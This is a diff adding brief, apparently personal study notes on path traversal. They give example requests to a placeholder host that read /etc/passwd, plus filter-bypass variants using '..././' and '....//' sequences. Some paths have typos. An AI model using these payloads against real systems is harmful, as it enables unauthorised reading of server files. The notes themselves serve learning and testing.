@@ -1,0 +1,19 @@
+the attacker could read arbitrary file or write to a oribitary file, if the paramter is not sanitized properly
+
+http://evil.net/get-file?name=test.php ----> normal request
+
+http://evil.net/get-file?name=../../../../etc/passwd --> evil request
+
+bypass techniques:
+
+try full path 
+
+http://evil.net/get-file?name=/etc/passwd
+
+if pattern is stripped of badly we can bypass it using
+
+http://evil.net/get-file?name=..././..././..././etc/passd
+
+http://evil.net/get-file?name=....//....//....//etc/passd
+
+
